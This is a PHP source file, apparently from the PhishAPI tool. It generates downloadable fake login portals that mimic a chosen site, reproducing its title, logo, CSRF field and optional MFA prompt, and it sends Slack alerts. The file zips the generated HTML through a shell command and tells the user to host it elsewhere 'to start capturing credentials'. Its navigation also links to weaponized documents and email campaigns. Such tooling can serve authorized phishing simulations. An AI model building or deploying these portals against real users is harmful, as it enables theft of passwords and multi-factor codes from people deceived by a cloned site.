<?php

// Display Template Options for Fake Site Credential Capturing
if(isset($_REQUEST['template'])){$template = $_REQUEST['template'];}else{$template = "";}

if(!isset($_REQUEST['APIURL'])){

// The Code Below Displays API Options for HTML Generation to Work With the API
?>

<HTML>
<HEAD>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="../main.css">
<link rel="stylesheet" href="../w3.css">
<TITLE>PhishAPI</TITLE>
<link rel="apple-touch-icon" sizes="57x57" href="../images/favicon/apple-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="../images/favicon/apple-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="../images/favicon/apple-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="../images/favicon/apple-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="../images/favicon/apple-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="../images/favicon/apple-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="../images/favicon/apple-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="../images/favicon/apple-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="../images/favicon/apple-icon-180x180.png">
<link rel="icon" type="image/png" sizes="192x192"  href="../images/favicon/android-icon-192x192.png">
<link rel="icon" type="image/png" sizes="32x32" href="../images/favicon/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="96x96" href="../images/favicon/favicon-96x96.png">
<link rel="icon" type="image/png" sizes="16x16" href="../images/favicon/favicon-16x16.png">
<link rel="manifest" href="../images/favicon/manifest.json">
<meta name="msapplication-TileColor" content="#ffffff">
<meta name="msapplication-TileImage" content="../images/favicon/ms-icon-144x144.png">
<meta name="theme-color" content="#ffffff">
</HEAD>
<BODY>
<FORM ACTION="../index.php" METHOD="GET">
  <div class="w3-dropdown-hover w3-right">
    <button class="w3-button w3-phishapi"><i class="fa fa-home fa-2x" aria-hidden="true" style="color: black;"></i> Home</button>
    <div class="w3-dropdown-content w3-bar-block w3-border" style="right:0">
      <a href="../index.php?fakesite=1" class="w3-bar-item w3-button"><i class="fa fa-user fa-1x" aria-hidden="true" style="color: black;"></i> Fake Portal</a>
      <a href="../phishingdocs/" class="w3-bar-item w3-button"><i class="fa fa-file-text fa-1x" aria-hidden="true" style="color: black;"></i> Weaponized Documents</a>
      <a href="../campaigns" class="w3-bar-item w3-button"><i class="fa fa-envelope fa-1x" aria-hidden="true" style="color: black;"></i> Email Campaigns</a>
          <a href="https://curtbraz.blogspot.com/2018/10/phishapi-tool-rapid-deployment-of-fake.html" class="w3-bar-item w3-button" target="_blank"><i class="fa fa-question-circle fa-1x" aria-hidden="true" style="color: black;"></i> Help / About</a>
          </div>
  </div></FORM><br><br><br>
<CENTER>
<FORM METHOD="POST"  ACTION="<?php $_SERVER["PHP_SELF"]; ?>">
<TABLE>
<TR><TH COLSPAN="2">Specifiy API Details for Form Submission</TH></TR>
<TR><TD>API URL: </TD><TD><INPUT TYPE="text" NAME="APIURL" VALUE="<?php echo $APIDomain;?>" PLACEHOLDER="This API URL" SIZE="40"></TD></TR>
<TR><TD>Project Name: </TD><TD><INPUT TYPE="text" NAME="Project" VALUE="" PLACEHOLDER="Project Name / Org / Phishing Campaign" SIZE="40"></TD></TR>
<TR><TD>Cloned URL: </TD><TD><INPUT TYPE="text" NAME="Redirect" VALUE="https://" PLACEHOLDER="Full URL of Site You're Mimicking" SIZE="40"></TD></TR>
<TR><TD>CSRF Token: </TD><TD><INPUT TYPE="text" NAME="csrffield" VALUE="" PLACEHOLDER="Enter Element Name/ID if Target Has CSRF" SIZE="40"></TD></TR>
<TR><TD>Slack Bot Name: </TD><TD><INPUT TYPE="text" NAME="SlackBotName" VALUE="PhishBot" PLACEHOLDER="Slack Bot Name" SIZE="40"></TD></TR>
<TR><TD>Slack Bot Logo: </TD><TD><INPUT TYPE="text" NAME="SlackEmoji" VALUE=":fishing_pole_and_fish:" PLACEHOLDER="Slack Bot Logo" SIZE="40"></TD></TR>
<TR><TD>Website Logo URL: </TD><TD><INPUT TYPE="text" NAME="ImageLogo" VALUE="" PLACEHOLDER="Use HTTPS to Avoid Mixed Content" SIZE="40"></TD></TR>
<TR><TD>Website Title: </TD><TD><INPUT TYPE="text" NAME="Title" VALUE="" PLACEHOLDER="ABC Company Secure Login Portal" SIZE="40"></TD></TR>
<TR><TD>MFA Token: </TD><TD style="text-align: left"><input type="checkbox" name="MFA" unchecked> Show Multi-Factor Authentication?<br><input type="checkbox" name="MFArequired" unchecked> Require</TD></TR>
</TABLE><br>
<INPUT TYPE="HIDDEN" NAME="templatename" VALUE="<?php echo $template; ?>">
<button class="btn" style="width:250px" type="submit">Generate Portal</button>
</FORM>
</CENTER>
</BODY>
</HTML>
<?php } else {

// If the Form Has Already Been Posted, Grab Parameters
if(isset($_REQUEST['APIURL'])){$APIURL = $_REQUEST['APIURL'];}else{$APIURL = $APIDomain;}
if(isset($_REQUEST['Project']) && $_REQUEST['Project'] != ""){$Project = $_REQUEST['Project'];}else{$Project = "Undefined Project";}
if(isset($_REQUEST['Redirect']) && $_REQUEST['Redirect'] != "https://"){$Redirect = $_REQUEST['Redirect'];}else{$Redirect = "https://www.google.com";}
if(isset($_REQUEST['SlackBotName'])){$SlackBotName = $_REQUEST['SlackBotName'];}else{$SlackBotName = "PhishBot";}
if(isset($_REQUEST['SlackEmoji'])){$SlackEmoji = $_REQUEST['SlackEmoji'];}else{$SlackEmoji = ":fishing_pole_and_fish:";}
if(isset($_REQUEST['ImageLogo'])){$ImageLogo = $_REQUEST['ImageLogo'];}else{$ImageLogo = "";}
if(isset($_REQUEST['Title'])){$Title = $_REQUEST['Title'];}else{$Title = "";}
if(isset($_REQUEST['MFA'])){$MFA = $_REQUEST['MFA'];}else{$MFA = "off";}
if(isset($_REQUEST['MFArequired'])){$MFArequired = $_REQUEST['MFArequired'];}else{$MFArequired = "off";}

// Generate HTML From Selected Template
$templatename = preg_replace('/[^a-zA-Z0-9 ]/', '', $_REQUEST['templatename']);

$htmlpath = $templatename."/template.php";

ob_start();
include_once($htmlpath);
$html = ob_get_contents();
ob_end_clean();

$my_file = $templatename."/index.html";
$handle = fopen($my_file, 'w') or die('Cannot open file:  '.$my_file);
fwrite($handle, $html);

// Zip up Generated HTML and Clean Up
$cmdzipup = "rm ".$templatename.".zip; cd ".$templatename."; zip -r ../".$templatename.".zip ".$templatename." *; rm index.html;";
exec($cmdzipup);

// Display Download Button for Generated HTML as an Archive
?>

<HTML>
<HEAD>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="../main.css">
<link rel="stylesheet" href="../w3.css">
<TITLE>PhishAPI</TITLE>
<link rel="apple-touch-icon" sizes="57x57" href="../images/favicon/apple-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="../images/favicon/apple-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="../images/favicon/apple-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="../images/favicon/apple-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="../images/favicon/apple-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="../images/favicon/apple-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="../images/favicon/apple-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="../images/favicon/apple-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="../images/favicon/apple-icon-180x180.png">
<link rel="icon" type="image/png" sizes="192x192"  href="../images/favicon/android-icon-192x192.png">
<link rel="icon" type="image/png" sizes="32x32" href="../images/favicon/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="96x96" href="../images/favicon/favicon-96x96.png">
<link rel="icon" type="image/png" sizes="16x16" href="../images/favicon/favicon-16x16.png">
<link rel="manifest" href="../images/favicon/manifest.json">
<meta name="msapplication-TileColor" content="#ffffff">
<meta name="msapplication-TileImage" content="../images/favicon/ms-icon-144x144.png">
<meta name="theme-color" content="#ffffff">
</HEAD>
<BODY>
<FORM ACTION="../index.php" METHOD="GET">
  <div class="w3-dropdown-hover w3-right">
    <button class="w3-button w3-phishapi"><i class="fa fa-home fa-2x" aria-hidden="true" style="color: black;"></i> Home</button>
    <div class="w3-dropdown-content w3-bar-block w3-border" style="right:0">
      <a href="../index.php?fakesite=1" class="w3-bar-item w3-button"><i class="fa fa-user fa-1x" aria-hidden="true" style="color: black;"></i> Fake Portal</a>
      <a href="../phishingdocs/" class="w3-bar-item w3-button"><i class="fa fa-file-text fa-1x" aria-hidden="true" style="color: black;"></i> Weaponized Documents</a>
      <a href="../campaigns" class="w3-bar-item w3-button"><i class="fa fa-envelope fa-1x" aria-hidden="true" style="color: black;"></i> Email Campaigns</a>
          <a href="https://curtbraz.blogspot.com/2018/10/phishapi-tool-rapid-deployment-of-fake.html" class="w3-bar-item w3-button" target="_blank"><i class="fa fa-question-circle fa-1x" aria-hidden="true" style="color: black;"></i> Help / About</a>
          </div>
  </div></FORM><br><br><br>
<FORM ACTION="<?php echo $templatename; ?>.zip" METHOD="GET">
<button class="btn" style="width:100%" type="submit"><i class="fa fa-download"></i> Download Source HTML</button>
</FORM>
<CENTER>
<FONT COLOR="#FFFFFF">Extract contents into your web directory on another server to start capturing credentials!<br>Feel free to modify the source code to include your own logo/theme!</FONT>
</CENTER>
</BODY>
</HTML>

<?php } ?>
